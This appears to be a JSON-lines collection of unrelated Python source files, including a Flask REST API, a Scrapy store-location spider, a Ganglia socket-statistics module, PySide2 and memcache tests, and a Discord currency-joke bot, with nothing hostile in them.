\"\n        query+= \"{wd:\"+i+\" wdt:P279 ?item.}\"\n        query+=\"UNION\"\n        query+=\"{wd:\"+i +\" wdt:P31 ?item.}\"\n    query+=' SERVICE wikibase:label { bd:serviceParam wikibase:language \"en\" } } '\n    r2=requests.get(link,params={'query':query,'format':'json' })\n    topicDict = {}\n    for i in r2.json()['results']['bindings']:\n        if 'item' in i:\n            q = re.search(\"(Q.+)\", (i['item']['value']))\n            if TopicRef.objects.filter(qId=q.group(0)).exists():\n                tr = TopicRef.objects.filter(qId=q.group(0)).first()\n                print(q.group(0))\n                print(tr.topic_id)\n                if not tr.topic_id in topicDict:\n                    topicDict[tr.topic_id] = 1\n                else :\n                    topicDict[tr.topic_id]+=1\n    topicData = list(topicDict.keys())\n    topicData = sorted(topicData, key=lambda obj: topicDict[obj], reverse=True)\n    return topicData\n## Find mutually tagged topics.\ndef findMutuallyTaggedTopics(search):\n    searchParam = search.capitalize()\n    topic = Topic.objects.filter(label__startswith=searchParam)\n    if(not topic.exists()):\n        return list()\n    TopicTags = OfTopic.objects.filter(topic_id=topic.first().id)\n    tagsOfTopic = list(TopicTags.values_list('tag_id'))\n    tagsOfTopic = list(topicTag[0] for topicTag in tagsOfTopic)\n    topicsWithCountOfTags = {}\n    for t in OfTopic.objects.all():\n        if not t.topic_id in topicsWithCountOfTags:\n            topicsWithCountOfTags[t.topic_id] = {\n                'count': 0\n            }\n        if t.tag_id in tagsOfTopic:\n            topicsWithCountOfTags[t.topic_id]['count'] += 1\n    topicsToRemove = list()\n    for t in topicsWithCountOfTags.keys():\n        if topicsWithCountOfTags[t]['count'] == 0:\n            topicsToRemove.append(t)\n    for t in topicsToRemove:\n        topicsWithCountOfTags.pop(t)\n    topicData = list(topicsWithCountOfTags.keys())\n    topicData = sorted(topicData, key=lambda obj: topicsWithCountOfTags[obj]['count'], reverse=True)\n    return topicData\n## Finds string matched topics.\ndef findStringMatchedTopics(search):\n    searchParam = search.capitalize()\n    topicsData = Topic.objects.filter(label__startswith=searchParam)\n    topics=list()\n    for i in topicsData:\n        topics.append(i.id)\n    return topics"}
{"text": "import logging\n\nfrom . import FileChecker\n\nl = logging.getLogger(__name__)\n\n\nclass CheckPackageMetadata(FileChecker):\n\n    def check(self):\n        if self.sub_path(\"package-metadata.json\").is_file():\n            self.fail(\"'package-metadata.json' is supposed to be automatically generated \"\n                      \"by Package Control during installation\")\n\n\nclass CheckPycFiles(FileChecker):\n\n    def check(self):\n        pyc_files = self.glob(\"**/*.pyc\")\n        if not pyc_files:\n            return\n\n        for path in pyc_files:\n            if path.with_suffix(\".py\").is_file():\n                with self.file_context(path):\n                    self.fail(\"'.pyc' file is redundant because its corresponding .py file exists\")\n\n\nclass CheckCacheFiles(FileChecker):\n\n    def check(self):\n        cache_files = self.glob(\"**/*.cache\")\n        if not cache_files:\n            return\n\n        for path in cache_files:\n            with self.file_context(path):\n                self.fail(\"'.cache' file is redundant and created by ST automatically\")\n\n\nclass CheckSublimePackageFiles(FileChecker):\n\n    def check(self):\n        cache_files = self.glob(\"**/*.sublime-package\")\n        if not cache_files:\n            return\n\n        for path in cache_files:\n            with self.file_context(path):\n                self.fail(\"'.sublime-package' files have no business being inside a package\")\n\n\nclass CheckSublimeWorkspaceFiles(FileChecker):\n\n    def check(self):\n        cache_files = self.glob(\"**/*.sublime-workspace\")\n        if not cache_files:\n            return\n\n        for path in cache_files:\n            with self.file_context(path):\n                self.fail(\"'.sublime-workspace' files contain session data and should never be \"\n                          \"submitted to version control\")\n"}
{"text": "#############################################################################\n##\n## Copyright (C) 2016 The Qt Company Ltd.\n## Contact: https://www.qt.io/licensing/\n##\n## This file is part of the test suite of PySide2.\n##\n## $QT_BEGIN_LICENSE:GPL-EXCEPT$\n## Commercial License Usage\n## Licensees holding valid commercial Qt licenses may use this file in\n## accordance with the commercial license agreement provided with the\n## Software or, alternatively, in accordance with the terms contained in\n## a written agreement between you and The Qt Company. For licensing terms\n## and conditions see https://www.qt.io/terms-conditions. For further\n## information use the contact form at https://www.qt.io/contact-us.\n##\n## GNU General Public License Usage\n## Alternatively, this file may be used under the terms of the GNU\n## General Public License version 3 as published by the Free Software\n## Foundation with exceptions as appearing in the file LICENSE.GPL3-EXCEPT\n## included in the packaging of this file. Please review the following\n## information to ensure the GNU General Public License requirements will\n## be met: https://www.gnu.org/licenses/gpl-3.0.html.\n##\n## $QT_END_LICENSE$\n##\n#############################################################################\n\nimport sys\nimport unittest\n\nimport helper\n\nfrom PySide2.QtCore import Property, QTimer, QUrl\nfrom PySide2.QtGui import QGuiApplication, QPen, QColor, QPainter\nfrom PySide2.QtQml import qmlRegisterType, ListProperty\nfrom PySide2.QtQuick import QQuickView, QQuickItem, QQuickPaintedItem\n\nclass PieSlice (QQuickPaintedItem):\n    def __init__(self, parent = None):\n        QQuickPaintedItem.__init__(self, parent)\n        self._color = QColor()\n        self._fromAngle = 0\n        self._angleSpan = 0\n\n    def getColor(self):\n        return self._color\n\n    def setColor(self, value):\n        self._color = value\n\n    def getFromAngle(self):\n        return self._angle\n\n    def setFromAngle(self, value):\n        self._fromAngle = value\n\n    def getAngleSpan(self):\n        return self._angleSpan\n\n    def setAngleSpan(self, value):\n        self._angleSpan = value\n\n    color = Property(QColor, getColor, setColor)\n    fromAngle = Property(int, getFromAngle, setFromAngle)\n    angleSpan = Property(int, getAngleSpan, setAngleSpan)\n\n    def paint(self, painter):\n        global paintCalled\n        pen = QPen(self._color, 2)\n        painter.setPen(pen);\n        painter.setRenderHints(QPainter.Antialiasing, True);\n        painter.drawPie(self.boundingRect(), self._fromAngle * 16, self._angleSpan * 16);\n        paintCalled = True\n\nclass PieChart (QQuickItem):\n    def __init__(self, parent = None):\n        QQuickItem.__init__(self, parent)\n        self._name = ''\n        self._slices = []\n\n    def getName(self):\n        return self._name\n\n    def setName(self, value):\n        self._name = value\n\n    name = Property(str, getName, setName)\n\n    def appendSlice(self, _slice):\n        global appendCalled\n        _slice.setParentItem(self)\n        self._slices.append(_slice)\n        appendCalled = True\n\n    slices = ListProperty(PieSlice, append=appendSlice)\n\nappendCalled = False\npaintCalled = False\n\nclass TestQmlSupport(unittest.TestCase):\n\n    def testIt(self):\n        app = QGuiApplication([])\n\n        qmlRegisterType(PieChart, 'Charts', 1, 0, 'PieChart');\n        qmlRegisterType(PieSlice, \"Charts\", 1, 0, \"PieSlice\");\n\n        view = QQuickView()\n        view.setSource(QUrl.fromLocalFile(helper.adjust_filename('registertype.qml', __file__)))\n        view.show()\n        QTimer.singleShot(250, view.close)\n        app.exec_()\n        self.assertTrue(appendCalled)\n        self.assertTrue(paintCalled)\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "from flask import Flask, jsonify, abort, make_response\nfrom flask_restful import Resource, reqparse, fields, marshal, marshal_with\nfrom flask_httpauth import HTTPBasicAuth\nfrom app import restApi\nfrom ..models import User, Post, Comment\n\nauth = HTTPBasicAuth()\n\n\n@auth.get_password\ndef get_password(username):\n    if username == 'miguel':\n        return 'python'\n    return None\n\n\n@auth.error_handler\ndef unauthorized():\n    # return 403 instead of 401 to prevent browsers from displaying the default\n    # auth dialog\n    return make_response(jsonify({'message': 'Unauthorized access'}), 403)\n\n\ntasks = [\n    {\n        'id': 1,\n        'title': u'Buy groceries',\n        'description': u'Milk, Cheese, Pizza, Fruit, Tylenol',\n        'done': False\n    },\n    {\n        'id': 2,\n        'title': u'Learn Python',\n        'description': u'Need to find a good Python tutorial on the web',\n        'done': False\n    }\n]\n\ntask_fields = {\n    'title': fields.String,\n    'description': fields.String,\n    'done': fields.Boolean,\n    'uri': fields.Url('task')\n}\n\nuser_fields = {\n    'id': fields.Integer,\n    'nickname': fields.String,\n    'firstname': fields.String,\n    'lastname': fields.String,\n    'email': fields.String,\n    'phone': fields.Integer,\n    'address': fields.String\n}\n\npost_fields = {\n    'id': fields.Integer,\n    'title': fields.String,\n    'body': fields.String,\n    'user_id': fields.Integer,\n    'location': fields.String,\n    'price': fields.Integer,\n    'address': fields.String,\n    'badroom_no': fields.Integer,\n    'garage_no': fields.Integer,\n    'bathroom_no': fields.Integer,\n    'style': fields.String\n}\n\n\ncomment_fields = {\n    'id': fields.Integer,\n    'body': fields.String,\n    'author_id': fields.Integer,\n    'post_id': fields.Integer,\n    'timestamp': fields.DateTime(dt_format='rfc822')\n}\n\n\nclass TaskListAPI(Resource):\n    decorators = [auth.login_required]\n\n    def __init__(self):\n        self.reqparse = reqparse.RequestParser()\n        self.reqparse.add_argument('title', type=str, required=True,\n                                   help='No task title provided',\n                                   location='json')\n        self.reqparse.add_argument('description', type=str, default=\"\",\n                                   location='json')\n        super(TaskListAPI, self).__init__()\n\n    def get(self):\n        return {'tasks': [marshal(task, task_fields) for task in tasks]}\n\n    def post(self):\n        args = self.reqparse.parse_args()\n        task = {\n            'id': tasks[-1]['id'] + 1,\n            'title': args['title'],\n            'description': args['description'],\n            'done': False\n        }\n        tasks.append(task)\n        return {'task': marshal(task, task_fields)}, 201\n\n\nclass TaskAPI(Resource):\n    decorators = [auth.login_required]\n\n    def __init__(self):\n        self.reqparse = reqparse.RequestParser()\n        self.reqparse.add_argument('title', type=str, location='json')\n        self.reqparse.add_argument('description', type=str, location='json')\n        self.reqparse.add_argument('done', type=bool, location='json')\n        super(TaskAPI, self).__init__()\n\n    def get(self, id):\n        task = [task for task in tasks if task['id'] == id]\n        if len(task) == 0:\n            abort(404)\n        return {'task': marshal(task[0], task_fields)}\n\n    def put(self, id):\n        task = [task for task in tasks if task['id'] == id]\n        if len(task) == 0:\n            abort(404)\n        task = task[0]\n        args = self.reqparse.parse_args()\n        for k, v in args.items():\n            if v is not None:\n                task[k] = v\n        return {'task': marshal(task, task_fields)}\n\n    def delete(self, id):\n        task = [task for task in tasks if task['id'] == id]\n        if len(task) == 0:\n            abort(404)\n        tasks.remove(task[0])\n        return {'result': True}\n\n\nclass UserAPI(Resource):\n    decorators = [auth.login_required]\n\n    @marshal_with(user_fields, envelope='user')\n    def get(self, id):\n        user = User.query.get_or_404(id)\n        return user, 200\n\n\nclass PostAPI(Resource):\n    decorators = [auth.login_required]\n\n    @marshal_with(post_fields, envelope='post')\n    def get(self, id):\n        post = Post.query.get_or_404(id)\n        return post, 200\n\n\nclass CommentAPI(Resource):\n    decorators = [auth.login_required]\n\n    @marshal_with(comment_fields, envelope='comment')\n    def get(self, id):\n        comment = Comment.query.get_or_404(id)\n        return comment, 200\n\nrestApi.add_resource(TaskListAPI, '/todo/api/v1.0/tasks', endpoint='tasks')\nrestApi.add_resource(TaskAPI, '/todo/api/v1.0/tasks/<int:id>', endpoint='task')\nrestApi.add_resource(UserAPI, '/users/<int:id>', endpoint='user')\nrestApi.add_resource(PostAPI, '/posts/<int:id>', endpoint='post')\nrestApi.add_resource(CommentAPI, '/comments/<int:id>', endpoint='comment')\n"}
{"text": "# (C) Datadog, Inc. 2018-present\n# All rights reserved\n# Licensed under a 3-clause BSD style license (see LICENSE)\nfrom codecs import open  # To use a consistent encoding\nfrom os import path\n\nfrom setuptools import setup\n\nHERE = path.dirname(path.abspath(__file__))\n\n# Get version info\nABOUT = {}\nwith open(path.join(HERE, 'datadog_checks', 'process', '__about__.py')) as f:\n    exec(f.read(), ABOUT)\n\n# Get the long description from the README file\nwith open(path.join(HERE, 'README.md'), encoding='utf-8') as f:\n    long_description = f.read()\n\n\ndef get_dependencies():\n    dep_file = path.join(HERE, 'requirements.in')\n    if not path.isfile(dep_file):\n        return []\n\n    with open(dep_file, encoding='utf-8') as f:\n        return f.readlines()\n\n\nCHECKS_BASE_REQ = 'datadog-checks-base>=11.2.0'\n\nsetup(\n    name='datadog-process',\n    version=ABOUT['__version__'],\n    description='The Process check',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    keywords='datadog agent process check',\n    # The project's main homepage.\n    url='https://github.com/DataDog/integrations-core',\n    # Author details\n    author='Datadog',\n    author_email='packages@datadoghq.com',\n    # License\n    license='BSD',\n    # See https://pypi.python.org/pypi?%3Aaction=list_classifiers\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Topic :: System :: Monitoring',\n        'License :: OSI Approved :: BSD License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n    ],\n    # The package we're going to ship\n    packages=['datadog_checks.process'],\n    # Run-time dependencies\n    install_requires=[CHECKS_BASE_REQ],\n    extras_require={'deps': get_dependencies()},\n    # Extra files to ship with the wheel package\n    include_package_data=True,\n)\n"}
{"text": "\"\"\"\nThis is an example plugin to give you an idea of how to use Clojure in your\nplugins, should you wish to.\n\nWe don't really expect anyone to use this, but we've included it to show that\nit's actually possible. If you like Lisps, take a look at Clojure and also\nClojurePy, which is what we're using here.\n\"\"\"\n\n__author__ = 'Gareth Coles'\n\nimport types\n\nimport cljplugin\n# Import main so the lib adds its import handler\nfrom clojure.lang import ifn\n\nfrom system import plugin\n\n\nclass ClojurePlugin(plugin.PluginObject):\n    \"\"\"\n    Example Clojure plugin\n    \"\"\"\n\n    def __init__(self):\n        super(ClojurePlugin, self).__init__()\n\n        self.clj_plugin = cljplugin\n\n    def setup(self):\n        # Now run the actual setup function\n        self.wrapper(self.clj_plugin.setup)()\n\n    def __getattribute__(self, item):\n        # This is so that you can have a clojure file that behaves like the\n        # actual plugin.\n        try:\n            # Check whether we defined our own attribute on this class\n            # noinspection PyCallByClass\n            return object.__getattribute__(self, item)\n        except AttributeError:\n            # If not, use the one on the clojure plugin\n            x = getattr(self.clj_plugin, item)\n\n            # Python function or Clojure function\n            if isinstance(x, types.FunctionType) or isinstance(x, ifn.IFn):\n                # See below for why we do this.\n                return self.wrapper(x)\n\n            return x\n\n    # This is used for interop because clojure files are modules, not\n    # classes, and so need to be wrapped to have access to self.\n    #\n    # Use this when you create any functions in Clojure files that need to be\n    # passed elsewhere - for example, event and command handlers.\n\n    def wrapper(self, func):\n        def inner(*args, **kwargs):\n            return func(self, *args, **kwargs)\n        return inner\n"}
{"text": "import logging\nfrom io import BytesIO\nfrom PIL import Image, ExifTags\nfrom followthemoney import model\n\nfrom ingestors.ingestor import Ingestor\nfrom ingestors.support.ocr import OCRSupport\nfrom ingestors.support.timestamp import TimestampSupport\nfrom ingestors.exc import ProcessingException\n\nlog = logging.getLogger(__name__)\n\n\nclass ImageIngestor(Ingestor, OCRSupport, TimestampSupport):\n    \"\"\"Image file ingestor class. Extracts the text from images using OCR.\"\"\"\n\n    MIME_TYPES = [\n        \"image/x-portable-graymap\",\n        \"image/png\",\n        \"image/x-png\",\n        \"image/jpeg\",\n        \"image/jpg\",\n        \"image/gif\",\n        \"image/pjpeg\",\n        \"image/bmp\",\n        \"image/x-windows-bmp\",\n        \"image/x-portable-bitmap\",\n        \"image/x-coreldraw\",\n        \"application/postscript\",\n        \"image/vnd.dxf\",\n    ]\n    EXTENSIONS = [\"jpg\", \"jpe\", \"jpeg\", \"png\", \"gif\", \"bmp\"]\n    SCORE = 10\n\n    def extract_exif(self, img, entity):\n        if not hasattr(img, \"_getexif\"):\n            return\n\n        exif = img._getexif()\n        if exif is None:\n            return\n\n        for num, value in exif.items():\n            try:\n                tag = ExifTags.TAGS[num]\n            except KeyError:\n                log.warning(\"Unknown EXIF code: %s\", num)\n                continue\n            if tag == \"DateTimeOriginal\":\n                entity.add(\"authoredAt\", self.parse_timestamp(value))\n            if tag == \"DateTime\":\n                entity.add(\"date\", self.parse_timestamp(value))\n            if tag == \"Make\":\n                entity.add(\"generator\", value)\n            if tag == \"Model\":\n                entity.add(\"generator\", value)\n\n    def ingest(self, file_path, entity):\n        entity.schema = model.get(\"Image\")\n        with open(file_path, \"rb\") as fh:\n            data = fh.read()\n\n        try:\n            image = Image.open(BytesIO(data))\n            image.load()\n            self.extract_exif(image, entity)\n            languages = self.manager.context.get(\"languages\")\n            text = self.extract_ocr_text(data, languages=languages)\n            entity.add(\"bodyText\", text)\n        except (OSError, IOError, Exception) as err:\n            raise ProcessingException(\"Failed to open image: %s\" % err)\n\n    @classmethod\n    def match(cls, file_path, entity):\n        score = super(ImageIngestor, cls).match(file_path, entity)\n        if score <= 0:\n            for mime_type in entity.get(\"mimeType\"):\n                if mime_type.startswith(\"image/\"):\n                    score = cls.SCORE - 1\n        return score\n"}
{"text": "#!/usr/bin/env python\n# -*- coding: utf-8 -*- \n\nfrom __future__ import print_function\nimport os\nimport json\nfrom datetime import datetime\n\n\nFONT = Glyphs.font\nFONTPATH = FONT.filepath\n\nNOW = datetime.now()\nTODAY = '%d-%d-%d' % (NOW.year, NOW.month, NOW.day)\n\nCURRENTFOLDER = os.path.dirname(FONTPATH)\nONELEVELDOWN = os.path.split(CURRENTFOLDER)[0]\n\nLOGNAME = FONT.familyName.lower().replace(\" \", \"_\")\nLOGFILE = ONELEVELDOWN + '/' + LOGNAME + '_log.txt'\n\n\ndef check_file(filepath):\n    '''\n    If the filepath does not exists, create.\n    return -> filepath = current/folder/filename.txt\n    '''\n    try: \n        file = open(filepath, 'r')\n    except IOError:\n        file = open(filepath, 'w')\n        json.dump([], file)\n    return filepath\n\n\ndef check_content(filepath, some_content):\n    with open(filepath, 'r') as fh:\n        # remove /n from strings\n        content_list = [x.strip() for x in fh.readlines()]\n        for item in content_list:\n            if some_content not in item.split():\n                continue\n            else:\n                return True\n\n\ndef compare_two_lists(l1, l2):\n    diff = set(l1).symmetric_difference(set(l2))\n    return diff\n\n\ndef add_2_json(filepath, new_entry):\n\n        with open(filepath) as feedsjson:\n            feeds = [json.load(feedsjson)]\n        feeds.append(new_entry)\n        \n        with open(filepath, mode='w') as f:\n            f.write(json.dumps(feeds, indent=4))\n\n\ndef masters_glyphs():\n    masters_dict = {}\n    for i, master in enumerate(FONT.masters):\n        mname = master.name\n        masters_dict[mname] = []   \n        for glyph in FONT.glyphs:    \n            id_master = glyph.layers[FONT.masters[i].id]\n            if len(id_master.paths) != 0:\n                masters_dict[mname].append(glyph.name)\n    return masters_dict\n\ntodays_glyphs = masters_glyphs()\ntodays_entry = (TODAY, todays_glyphs)\n\n\ndef main():\n    fp = check_file(LOGFILE)\n    if not check_content(fp, TODAY):\n        add_2_json(fp, todays_entry)\n\nmain()\n\n\n# ----------- testing\n\nimport os\ncwd = os.getcwd()\nf = cwd + '/new_file002.txt'\n\nprint(f)  # def check_file\n# print check_content(f, 'ops')  # def check_content\n\nnew_file = check_file(f)\nnew_data = {'123': ['a', 'b', 'c', 'd'], '456': ['a', 'b', 'c', 'd', 'e', 'f', 'g']}\n\nadd_2_json(new_file, new_data)\n\nl1 = new_data['123']\nl2 = new_data['456']\n\nlist3 = ['a', 'b', 'c', 'd']\nlist4 = ['a', 'b', 'c', 'd', 'e', 'f', 'g']\n\nprint(compare_two_lists(list3, list4))\n"}
{"text": "# sockstat module for ganglia 3.1.x and above\n# Copyright (C) Wang Jian <lark@linux.net.cn>, 2009\n\nimport os, sys\nimport time\n\nlast_poll_time = 0\nsockstats = {\n    'tcp_total': 0,\n    'tcp_established': 0,\n    'tcp_orphan': 0,\n    'tcp_timewait': 0,\n    'udp_total': 0 }\n\ndef metric_update():\n    global sockstats\n\n    f = open('/proc/net/sockstat', 'r')\n\n    for l in f:\n        line = l.split()\n        if (line[0] == 'TCP:'):\n            sockstats['tcp_total'] = int(line[2])\n            sockstats['tcp_orphan'] = int(line[4])\n            sockstats['tcp_established'] = int(line[2]) - int(line[4])\n            sockstats['tcp_timewait'] = int(line[6])\n            continue\n\n        if (line[0] == 'UDP:'):\n            sockstats['udp_total'] = int(line[2])\n            continue\n\n    f.close()\n\ndef metric_read(name):\n    global last_poll_time\n    global sockstats\n    now_time = time.time()\n\n    '''time skewed'''\n    if now_time < last_poll_time:\n        last_poll_time = now_time\n        return 0\n\n    '''we cache statistics for 2 sec, it's enough for polling all 3 counters'''\n    if (now_time - last_poll_time) > 2:\n        metric_update()\n        last_poll_time = now_time\n\n    return sockstats[name]\n\ndescriptors = [{\n        'name': 'tcp_total',\n        'call_back': metric_read,\n        'time_max': 20,\n        'value_type': 'uint',\n        'units': 'Sockets',\n        'slope': 'both',\n        'format': '%u',\n        'description': 'Total TCP sockets',\n        'groups': 'network',\n    },\n    {\n        'name': 'tcp_established',\n        'call_back': metric_read,\n        'time_max': 20,\n        'value_type': 'uint',\n        'units': 'Sockets',\n        'slope': 'both',\n        'format': '%u',\n        'description': 'TCP established sockets',\n        'groups': 'network',\n    },\n    {\n        'name': 'tcp_timewait',\n        'call_back': metric_read,\n        'time_max': 20,\n        'value_type': 'uint',\n        'units': 'Sockets',\n        'slope': 'both',\n        'format': '%u',\n        'description': 'TCP timewait sockets',\n        'groups': 'network',\n    },\n    {\n        'name': 'udp_total',\n        'call_back': metric_read,\n        'time_max': 20,\n        'value_type': 'uint',\n        'units': 'Sockets',\n        'slope': 'both',\n        'format': '%u',\n        'description': 'Total UDP sockets',\n        'groups': 'network',\n    }]\n\ndef metric_init(params):\n    return descriptors\n\ndef metric_cleanup():\n    pass\n\n# for unit testing\nif __name__ == '__main__':\n    metric_init(None)\n    for d in descriptors:\n        v = d['call_back'](d['name'])\n        print '%s = %d' % (d['name'], v)\n    print \"----\"\n\n    while 1:\n        time.sleep(1)\n        for d in descriptors:\n            v = d['call_back'](d['name'])\n            print '%s = %d' % (d['name'], v)\n        print \"----\"\n"}
{"text": "#!/usr/bin/env python\n\n\"\"\"\n    django-info-panel\n    ~~~~~~~~~~~~~~~~~\n\n    :copyleft: 2015-2016 by the django-debug-toolbar-django-info team, see AUTHORS for more details.\n    :created: 2015 by JensDiemer.de\n    :license: GNU GPL v3 or above, see LICENSE for more details.\n\"\"\"\n\nfrom __future__ import absolute_import, unicode_literals\n\nimport logging\n\nfrom django.db import connection\nfrom django.apps import apps\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom debug_toolbar.panels import Panel\n\nlogger = logging.getLogger(__name__)\n\n\nclass DatabaseInfo(Panel):\n    nav_title = _(\"Database\")\n    title=_(\"Database Information\")\n    template = 'django_info/panels/database.html'\n\n    def process_response(self, request, response):\n        apps_info = []\n        app_configs = apps.get_app_configs()\n        for app_config in app_configs:\n            models = app_config.get_models()\n            model_info = []\n            for model in models:\n                model_info.append({\n                    \"name\":model._meta.object_name,\n                })\n            apps_info.append({\n                \"app_name\": app_config.name,\n                \"app_models\": model_info,\n            })\n\n        self.record_stats({\n            \"db_backend_name\": connection.Database.__name__,\n            \"db_backend_module\": connection.Database.__file__,\n            \"db_backend_version\": getattr(connection.Database, \"version\", \"?\"),\n\n            \"apps_info\": apps_info,\n\n            \"db_table_names\": sorted(connection.introspection.table_names()),\n            \"django_tables\": sorted(connection.introspection.django_table_names()),\n        })\n\n"}
{"text": "import scrapy\nimport re\nfrom locations.items import GeojsonPointItem\n\nclass ElPolloLocoSpider(scrapy.Spider):\n    name = \"elpolloloco\"\n    allowed_domains = [\"www.elpolloloco.com\"]\n    start_urls = (\n        'https://www.elpolloloco.com/locations/all-locations.html',\n    )\n\n    def parse_stores(self, response):\n        properties = {\n            'addr_full': response.xpath('normalize-space(//meta[@itemprop=\"streetAddress\"]/@content)').extract_first(),\n            'phone': response.xpath('normalize-space(//div[@itemprop=\"telephone\"]/text())').extract_first(),\n            'city': response.xpath('normalize-space(//meta[@itemprop=\"addressLocality\"]/@content)').extract_first(),\n            'state': response.xpath('normalize-space(//meta[@itemprop=\"addressRegion\"]/@content)').extract_first(),\n            'postcode':response.xpath('normalize-space(//meta[@itemprop=\"postalCode\"]/@content)').extract_first(),\n            'ref': response.xpath('normalize-space(//div[@itemprop=\"branchCode\"]/text())').extract_first(),\n            'website': response.url,\n            'lat': response.xpath('normalize-space(//meta[@itemprop=\"latitude\"]/@content)').extract_first(),\n            'lon': response.xpath('normalize-space(//meta[@itemprop=\"longitude\"]/@content)').extract_first(),\n            'opening_hours': self.parse_opening_hours(response.xpath('//div[@itemprop=\"openingHoursSpecification\"]')),\n        }\n        yield GeojsonPointItem(**properties)\n\n    def parse_opening_hours(self, opening_hours_div):\n        result_array = []\n        for div in opening_hours_div:\n            day_of_week_list = div.xpath('normalize-space(./meta[@itemprop=\"dayOfWeek\"]/@href)').extract_first().rsplit(\"/\",1)\n            open_time = div.xpath('normalize-space(./meta[@itemprop=\"opens\"]/@content)').extract_first().rsplit(\":\",1)[0]\n            close_time = div.xpath('normalize-space(./meta[@itemprop=\"closes\"]/@content)').extract_first().rsplit(\":\",1)[0]\n            \n            if (len(day_of_week_list) == 2):\n                day_of_week = day_of_week_list[-1][:2]\n                result_array.append(\"%s %s-%s\" % (day_of_week, open_time, close_time))\n        return ';'.join(result_array)\n\n\n\n    def parse(self, response):\n        urls = response.xpath('//p[@class=\"locaFLstoreInfo\" and ./a/span[@class =\"locaSSComingSoon\" and not(contains(./text(),\"(Coming Soon)\"))]]/a/@href').extract()\n        for path in urls:\n                yield scrapy.Request(response.urljoin(path), callback=self.parse_stores)\n"}
{"text": "import re\n\n\nclass Schmeckles:\n    def __init__(self, bot):\n        self.bot = bot\n        self.p = re.compile('([^\\n\\.\\,\\r\\d-]{0,30})(-?[\\d|,]{0,300}\\.{0,1}\\d{1,300} schmeckle[\\w]{0,80})([^\\n\\.\\,\\r\\d-]{0,30})', re.IGNORECASE)\n\n    async def schmeckle2usd(self, schmeckle):\n        \"\"\"1 Schmeckle = $148 USD\n        https://www.reddit.com/r/IAmA/comments/202owt/we_are_dan_harmon_and_justin_roiland_creators_of/cfzfv79\"\"\"\n        return schmeckle * 148.0\n\n    async def schmeckle2eur(self, schmeckle):\n        return schmeckle * 139.25   # latest USDEUR value\n\n    async def schmeckle2yen(self, schmeckle):\n        return schmeckle * 139.25   # latest USDYEN value\n\n    async def schmeckle2rub(self, schmeckle):\n        return schmeckle * 139.25   # latest USDRUB value\n\n    async def searchForSchmeckles(self, content):\n        if any([x in content.lower() for x in ['?', 'how much', 'what is', 'how many', 'euro', 'usd', 'dollars', 'dollar', 'euros']]):\n            return self.p.search(content)\n        return None\n\n    async def getSchmeckles(self, content):\n        get_schmeckles = await self.searchForSchmeckles(content)\n        if get_schmeckles:\n            match = get_schmeckles.groups()\n            euro = any([x in match[-1].lower() for x in ['eur', 'euro', 'euros']])\n            dollar = any([x in match[-1].lower() for x in ['usd', 'dollar', 'dollars']])\n            if euro and not dollar:\n                value = await self.schmeckle2eur(float(match[1].split()[0])), 'EUR', match[1].split()[0]\n            elif dollar and not euro:\n                value = await self.schmeckle2usd(float(match[1].split()[0])), 'USD', match[1].split()[0]\n            elif not dollar and not euro:\n                value = await self.schmeckle2usd(float(match[1].split()[0])), 'USD', match[1].split()[0]\n            return value\n        return None\n\n    async def _on_message(self, message):\n        content = message.content\n        author = message.author\n        channel = message.channel\n        if author.id != self.bot.user.id:\n            schmeckles = await self.getSchmeckles(content)\n            if schmeckles:\n                await self.bot.send_message(channel, '{0[2]} SHM is about {0[0]:.2f} {0[1]}'.format(schmeckles))\n\n\ndef setup(bot):\n    cog = Schmeckles(bot)\n    bot.add_listener(cog._on_message, \"on_message\")\n    bot.add_cog(cog)\n"}
{"text": "#!/usr/bin/env python\n# Copyright 2010-2012 RethinkDB, all rights reserved.\nfrom random import shuffle\nimport sys, os\nsys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), os.path.pardir, 'common')))\nimport memcached_workload_common\nfrom vcoptparse import *\n\nop = memcached_workload_common.option_parser_for_memcache()\ndel op[\"mclib\"]   # No longer optional; we only work with memcache.\nop[\"num_ints\"] = IntFlag(\"--num-ints\", 10)\nopts = op.parse(sys.argv)\nopts[\"mclib\"] = \"memcache\"\n\nwith memcached_workload_common.make_memcache_connection(opts) as mc:\n    print \"Shuffling numbers\"\n    ints = range(0, opts[\"num_ints\"])\n    shuffle(ints)\n\n    print \"Checking cas on numbers\"\n    \n    for i in ints:\n        print \"Inserting %d\" % i\n        if (0 == mc.set(str(i), str(i))):\n            raise ValueError(\"Insert of %d failed\" % i)\n            \n        print \"Getting %d\" % i\n        value, _, cas_id = mc.explicit_gets(str(i))\n        if (value != str(i)):\n            raise ValueError(\"get failed, should be %d=>%d, was %s\" % (i, i, value))\n            \n        print \"'cas'-ing %d\" % i\n        if (0 == mc.explicit_cas(str(i), str(i+1), cas_id)):\n            raise ValueError(\"cas of %d failed\" % i)\n            \n        print \"Verifying cas %d\" % i\n        value, _, cas_id = mc.explicit_gets(str(i))\n        if (value != str(i+1)):\n            raise ValueError(\"get for cas failed, should be %d=>%d, was %s\" % (i, i+1, value))\n            \n        print \"Modifying %d again\" % i\n        if (0 == mc.set(str(i), str(i+10))):\n            raise ValueError(\"Modify of %d failed\" % i)\n            \n        print \"'cas'-ing %d again\" % i\n        if (0 != mc.explicit_cas(str(i), str(i+20), cas_id)):\n            raise ValueError(\"cas of %d should have failed, item has been modified\" % i)\n"}
